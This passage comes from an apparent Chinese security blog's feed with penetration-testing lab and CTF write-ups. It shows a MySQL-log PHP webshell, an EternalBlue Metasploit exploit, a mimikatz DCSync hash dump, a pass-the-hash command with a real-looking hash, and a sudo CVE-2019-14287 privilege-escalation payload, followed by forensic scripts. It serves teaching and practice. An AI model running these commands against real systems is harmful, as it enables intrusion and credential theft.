class="hljs-operator">=</span> <span class="hljs-keyword">ON</span>;<br></code></pre></td></tr></table></figure><p>设置日志保存位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file <span class="hljs-operator">=</span> &quot;C:/phpStudy/PHPTutorial/www/a.php&quot;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-11.png"></p><p>写入shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>getshell</p><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-12.png"></p><h2 id="DC（172-22-1-2）"><a href="#DC（172-22-1-2）" class="headerlink" title="DC（172.22.1.2）"></a>DC（172.22.1.2）</h2><p>fscan扫出来有ms17-010，直接用msfconsole打</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br>exploit<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-13.png"></p><p>加载mimikatz(kiwi就是msf内置的mimikatz模块的升级版)<br>通过DCSync导出域内哈希</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-14.png"></p><p>抓到了Administrator的hash，加上之前扫出来 DC(172.22.1.2) 的 445 端口是开放的，可以利用 smb 哈希传递拿下域控制器</p><p>使用 crackmapexec 来进行PTH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x <span class="hljs-string">&quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E5%86%85%E7%BD%91/ichunqiu/Initial-15.png"></p><p>得到flag3：<code>flag03: e8f88d0d43d6&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;开始签到白嫖打完所有靶机计划!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;前置知识:&lt;/p&gt;</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云境" scheme="https://www.dr0n.top/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/"/>
    
    <category term="专业徽章" scheme="https://www.dr0n.top/tags/%E4%B8%93%E4%B8%9A%E5%BE%BD%E7%AB%A0/"/>
    
    <category term="DCSync" scheme="https://www.dr0n.top/tags/DCSync/"/>
    
  </entry>
  
  <entry>
    <title>linux提权笔记</title>
    <link href="https://www.dr0n.top/posts/fcb3a8d7/"/>
    <id>https://www.dr0n.top/posts/fcb3a8d7/</id>
    <published>2025-05-09T04:00:00.000Z</published>
    <updated>2025-08-17T05:40:48.227Z</updated>
    
    <content type="html"><![CDATA[<p>记录在比赛和靶场中遇到的提权方法</p><p>推荐本地部署一个<a href="https://github.com/GTFOBins/GTFOBins.github.io">GTFOBins</a>用来查询</p><h1 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h1><blockquote><p>SUID是一种特殊权限，可以让调用者在执行过程中暂时获得该文件拥有者的权限。如果可以找到并运行root用户所拥有的SUID的文件，那么就可以在运行该文件的时候获得root用户权限</p></blockquote><p>查找当前系统上文件属主为 root 并且拥有 SUID 权限的可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt; result.txt<br>find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>找到命令后可以在GTFOBins查找用法</p><h1 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h1><h2 id="权限分配不当"><a href="#权限分配不当" class="headerlink" title="权限分配不当"></a>权限分配不当</h2><blockquote><p>sudo（super user do）是linux系统中用于管理用户权限的工具，允许普通用户在无需切换到超级用户的情况下以root身份执行命令，通常，在使用sudo命令时，用户需要输入自己的密码验证自己是否有权限使用</p></blockquote><p>查看可利用的sudo权限工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -l<br></code></pre></td></tr></table></figure><p>然后在gtfobins查询利用方法</p><p>例子：</p><p><img src="/img/linux/sudo-1.png"></p><p><img src="/img/linux/sudo-2.png"></p><h2 id="CVE-2019-14287"><a href="#CVE-2019-14287" class="headerlink" title="CVE-2019-14287"></a>CVE-2019-14287</h2><p>1.8.28之前的sudo版本均会受到影响</p><p>现在的用户alice没权限看flag文件</p><p><img src="/img/linux/CVE-2019-14287-1.jpg"></p><p>查看sudo版本</p><p><img src="/img/linux/CVE-2019-14287-2.jpg"></p><p>符合利用条件，payload：<code>sudo -u#-1 /bin/bash</code></p><p><img src="/img/linux/CVE-2019-14287-3.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录在比赛和靶场中遇到的提权方法&lt;/p&gt;
&lt;p&gt;推荐本地部署一个&lt;a href=&quot;https://github.com/GTFOBins/GTFOBins.github.io&quot;&gt;GTFOBins&lt;/a&gt;用来查询&lt;/p&gt;
&lt;h1 id=&quot;suid-提权&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="提权" scheme="https://www.dr0n.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>第八届西湖论剑中国杭州网络安全安全技能大赛初赛 部分wp</title>
    <link href="https://www.dr0n.top/posts/74a23a1b/"/>
    <id>https://www.dr0n.top/posts/74a23a1b/</id>
    <published>2025-01-18T12:00:00.000Z</published>
    <updated>2025-07-27T10:03:26.075Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ds"><a href="#ds" class="headerlink" title="ds"></a>ds</h1><h2 id="easydatalog"><a href="#easydatalog" class="headerlink" title="easydatalog"></a>easydatalog</h2><p>分析<code>error.log</code>发现首先上传了木马，然后用蚁剑进行连接</p><p>全局搜索发现包含一个zip和jpg</p><p><img src="/img/wp/2025/xhlj-easydatalog-2.png"></p><p>压缩包数据很少直接手动提取出来，图片数据太多用脚本提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_jpg_data</span>(<span class="hljs-params">log_file</span>):<br>    <span class="hljs-comment"># 读取日志文件内容</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br><br>    lines = content.split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    hex_data = []<br><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-comment"># 跳过包含readbytes或bytes的行</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;readbytes&#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;bytes&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># 如果行包含dumpio_in或dumpio_out</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;dumpio_in&#x27;</span> <span class="hljs-keyword">in</span> line <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;dumpio_out&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            <span class="hljs-comment"># 提取冒号后的内容</span><br>            parts = line.split(<span class="hljs-string">&#x27;dumpio_in (data-HEAP): &#x27;</span>, maxsplit=<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">1</span>:<br>                data = parts[<span class="hljs-number">1</span>].strip()<br>            <span class="hljs-keyword">else</span>:<br>                parts = line.split(<span class="hljs-string">&#x27;dumpio_out (data-HEAP): &#x27;</span>, maxsplit=<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt; <span class="hljs-number">1</span>:<br>                    data = parts[<span class="hljs-number">1</span>].strip()<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">continue</span><br><br>            hex_data.append(data)<br><br>    data = <span class="hljs-string">&#x27;&#x27;</span>.join(hex_data)<br><br>    <span class="hljs-comment"># 查找jpg数据（从FFD8到FFD9）</span><br>    jpg_pattern = <span class="hljs-string">r&#x27;FFD8FFE0.*?00FFD9&#x27;</span><br>    jpg_matches = re.findall(jpg_pattern, data)<br><br>    <span class="hljs-comment"># 保存找到的jpg数据</span><br>    <span class="hljs-keyword">for</span> i, jpg_data <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(jpg_matches):<br>        binary_data = <span class="hljs-built_in">bytes</span>.fromhex(jpg_data)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;out.jpg&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(binary_data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    extract_jpg_data(<span class="hljs-string">&#x27;error.log&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>图片盲水印得到密码</p><p><img src="/img/wp/2025/xhlj-easydatalog-1.png"></p><p>用得到的密码<code>dataPersonPass123987</code>解压压缩包得到用户信息表</p><p>拼接出张三的身份证号和手机号</p><p><code>30601319731003117X_79159498824</code></p><h2 id="DSASignatureData"><a href="#DSASignatureData" class="headerlink" title="DSASignatureData"></a>DSASignatureData</h2><p>tshark筛选出所有的数据</p><p><code>tshark -r data.pcapng -T fields -e http.file_data  -e http.request.uri &gt; data.txt</code></p><p>对筛选出来的数据进行整理，转成明文后去重和排序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><br><span class="hljs-comment"># 将十六进制字符串转换为字节，然后解码为UTF-8字符串</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_hex_string</span>(<span class="hljs-params">hex_string</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>.fromhex(hex_string).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        lines = f.readlines()<br><br>    result = []<br>    seen = <span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 用于记录已经处理过的数据</span><br><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/?userid=&#x27;</span> <span class="hljs-keyword">in</span> line:<br><br>            json_hex = line.strip().split(<span class="hljs-string">&#x27;\t&#x27;</span>)[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 提取JSON数据部分</span><br>            <span class="hljs-keyword">try</span>:<br>                json_str = decode_hex_string(json_hex)<br>                data = json.loads(json_str)<br>                userid = line.split(<span class="hljs-string">&#x27;/?userid=&#x27;</span>)[<span class="hljs-number">1</span>].split()[<span class="hljs-number">0</span>]<br>                data[<span class="hljs-string">&#x27;userid&#x27;</span>] = userid<br><br>                unique_key = (data[<span class="hljs-string">&#x27;idcard&#x27;</span>], data[<span class="hljs-string">&#x27;phone&#x27;</span>])<br><br>                <span class="hljs-keyword">if</span> unique_key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen:<br>                    seen.add(unique_key)<br>                    result.append(data)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(result)&#125;</span> unique records&quot;</span>)<br><br>    result.sort(key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">int</span>(x[<span class="hljs-string">&#x27;userid&#x27;</span>]))<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data_new.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> result:<br>            line = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;userid&#x27;</span>]&#125;</span>,<span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;name&#x27;</span>]&#125;</span>,<span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;idcard&#x27;</span>]&#125;</span>,<span class="hljs-subst">&#123;data[<span class="hljs-string">&#x27;phone&#x27;</span>]&#125;</span>\n&quot;</span><br>            f.write(line)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    process_data()<br></code></pre></td></tr></table></figure><p>得到全部的数据</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">userid,name,idcard,phone<br>1,侯俊英,532215199108067664,73457647068<br>2,寇雪,637373199908267850,79311464433<br>3,南郭映安,516067201404039268,79843161520<br>4,仲长宗,690694198504259989,78927258687<br>5,伏羲永琴,968155199102184917,78781034018<br>6,班涵润,496980198102184431,73056859184<br>7,丁映安,098529200809222274,79398505211<br>8,通春雪,838747198907275515,74568181144<br>...<br>1996,东关燕子,864371198811109088,75589142337<br>1997,桂秀慧,921145197101023429,73457033928<br>1998,车钗,284617199806039673,74960899903<br>1999,文浩渺,829973198603161976,73871235789<br>2000,祁陈红,987193201007052887,74518763400<br></code></pre></td></tr></table></figure><p>然后与data-sign.csv中的签名数据比较</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> hashes<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="hljs-keyword">import</span> dsa, utils<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.serialization <span class="hljs-keyword">import</span> load_pem_public_key<br><span class="hljs-keyword">from</span> cryptography.exceptions <span class="hljs-keyword">import</span> InvalidSignature<br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_public_key</span>(<span class="hljs-params">userid</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;加载用户的公钥&quot;&quot;&quot;</span><br>    userid_padded = <span class="hljs-built_in">str</span>(userid).zfill(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;public/public-<span class="hljs-subst">&#123;userid_padded&#125;</span>.pem&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        key_data = f.read()<br>        <span class="hljs-keyword">return</span> load_pem_public_key(key_data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_signature</span>(<span class="hljs-params">public_key, message, signature</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;验证签名&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 解码Base64签名</span><br>        signature_bytes = base64.b64decode(signature)<br><br>        <span class="hljs-comment"># 提取r和s值</span><br>        r = <span class="hljs-built_in">int</span>.from_bytes(signature_bytes[:<span class="hljs-number">20</span>], <span class="hljs-string">&#x27;big&#x27;</span>)<br>        s = <span class="hljs-built_in">int</span>.from_bytes(signature_bytes[<span class="hljs-number">20</span>:], <span class="hljs-string">&#x27;big&#x27;</span>)<br><br>        <span class="hljs-comment"># 计算消息哈希并编码签名</span><br>        message_bytes = message.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        encoded_signature = utils.encode_dss_signature(r, s)<br><br>        <span class="hljs-comment"># 验证签名</span><br>        public_key.verify(<br>            encoded_signature,<br>            message_bytes,<br>            hashes.SHA256()<br>        )<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> (InvalidSignature, Exception):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_records</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;验证所有记录&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 读取原始数据</span><br>    original_data = &#123;&#125;<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data_new.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-built_in">next</span>(f)  <span class="hljs-comment"># 跳过标题行</span><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            userid, name, idcard, phone = line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>            original_data[userid] = &#123;<br>                <span class="hljs-string">&#x27;name&#x27;</span>: name,<br>                <span class="hljs-string">&#x27;idcard&#x27;</span>: idcard,<br>                <span class="hljs-string">&#x27;phone&#x27;</span>: phone<br>            &#125;<br><br>    <span class="hljs-comment"># 读取签名数据</span><br>    signatures = &#123;&#125;<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data-sign.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        reader = csv.DictReader(f)<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>            userid = row[<span class="hljs-string">&#x27;username&#x27;</span>]<br>            signatures[userid] = &#123;<br>                <span class="hljs-string">&#x27;name_signature&#x27;</span>: row[<span class="hljs-string">&#x27;name_signature&#x27;</span>],<br>                <span class="hljs-string">&#x27;idcard_signature&#x27;</span>: row[<span class="hljs-string">&#x27;idcard_signature&#x27;</span>],<br>                <span class="hljs-string">&#x27;phone_signature&#x27;</span>: row[<span class="hljs-string">&#x27;phone_signature&#x27;</span>]<br>            &#125;<br><br>    <span class="hljs-comment"># 验证每条记录</span><br>    tampered_records = []<br>    <span class="hljs-keyword">for</span> userid, orig_data <span class="hljs-keyword">in</span> original_data.items():<br>        <span class="hljs-comment"># 加载公钥</span><br>        <span class="hljs-keyword">try</span>:<br>            public_key = load_public_key(userid)<br>            sig_data = signatures[userid]<br><br>            <span class="hljs-comment"># 验证所有字段的签名</span><br>            name_valid = verify_signature(public_key, orig_data[<span class="hljs-string">&#x27;name&#x27;</span>], sig_data[<span class="hljs-string">&#x27;name_signature&#x27;</span>])<br>            idcard_valid = verify_signature(public_key, orig_data[<span class="hljs-string">&#x27;idcard&#x27;</span>], sig_data[<span class="hljs-string">&#x27;idcard_signature&#x27;</span>])<br>            phone_valid = verify_signature(public_key, orig_data[<span class="hljs-string">&#x27;phone&#x27;</span>], sig_data[<span class="hljs-string">&#x27;phone_signature&#x27;</span>])<br><br>            <span class="hljs-comment"># 如果任何字段验证失败，记录该条数据</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (name_valid <span class="hljs-keyword">and</span> idcard_valid <span class="hljs-keyword">and</span> phone_valid):<br>                tampered_records.append(&#123;<br>                    <span class="hljs-string">&#x27;userid&#x27;</span>: userid,<br>                    <span class="hljs-string">&#x27;name&#x27;</span>: orig_data[<span class="hljs-string">&#x27;name&#x27;</span>],<br>                    <span class="hljs-string">&#x27;idcard&#x27;</span>: orig_data[<span class="hljs-string">&#x27;idcard&#x27;</span>],<br>                    <span class="hljs-string">&#x27;phone&#x27;</span>: orig_data[<span class="hljs-string">&#x27;phone&#x27;</span>]<br>                &#125;)<br>        <span class="hljs-keyword">except</span> Exception:<br>            <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">return</span> tampered_records<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 验证记录并获取被篡改的数据</span><br>    tampered_records = verify_records()<br><br>    <span class="hljs-comment"># 将被篡改的记录写入CSV文件</span><br>    <span class="hljs-keyword">if</span> tampered_records:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;tampered_records.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            writer = csv.DictWriter(f, fieldnames=[<span class="hljs-string">&#x27;userid&#x27;</span>, <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;idcard&#x27;</span>, <span class="hljs-string">&#x27;phone&#x27;</span>])<br>            writer.writeheader()<br>            writer.writerows(tampered_records)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(tampered_records)&#125;</span> tampered records. Details written to tampered_records.csv&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No tampered records found.&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2025/xhlj-DSASignatureData.png"></p><h2 id="easyrawencode"><a href="#easyrawencode" class="headerlink" title="easyrawencode"></a>easyrawencode</h2><p>vol2分析镜像</p><p>搜常见后缀</p><p><code>python vol.py -f easyrawencode.raw --profile Win7SP1x64 filescan | grep -E &quot;txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag&quot;</code></p><p>发现hack.py</p><p><code>python vol.py -f easyrawencode.raw --profile Win7SP1x64 dumpfiles -Q  0x000000003dfdf070 -D ./</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 